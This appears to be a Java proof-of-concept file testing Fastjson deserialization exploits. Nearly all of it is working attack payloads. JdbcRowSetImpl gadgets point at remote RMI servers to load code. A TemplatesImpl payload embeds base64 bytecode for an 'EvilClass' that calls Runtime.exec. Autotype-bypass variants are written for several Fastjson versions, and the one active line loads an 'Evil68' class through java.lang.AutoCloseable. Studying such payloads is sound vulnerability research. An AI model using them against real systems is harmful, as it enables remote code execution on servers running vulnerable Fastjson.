package com.ocean;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FasejsonVul {
    public static void main(String[] args) {
//        String json = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://10.169.5.52:1099/kyesra\",\"autoCommit\":true}";
//        JSON.parse(json);
//        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABdMb3JnL2V4YW1wbGUvRXZpbENsYXNzOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAJZXZpbENsYXNzBwAuAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAIAAkHAC8MADAAMQEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAMgAzAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABMADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAPAAAABAABABcAAQARABgAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABYADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAZABoAAgAAAAEAGwAcAAMADwAAAAQAAQAXAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABkACAAaAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\n\"],'_name':'exp','_tfactory':{ },\"_outputProperties\":{ }}";
//        JSON.parseObject(payload, Feature.SupportNonPublicField);
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String json25= "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://10.37.129.2:1099/l1pwqj\",\"autoCommit\":true}";
//        String json47 = "{\"1\":{\"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\"},\"2\": {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"rmi://10.37.129.2:1099/l1pwqj\", \"autoCommit\": true}}";
        String json68 = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.ocean.Evil68\"}";
        JSON.parseObject(json68);

    }
}
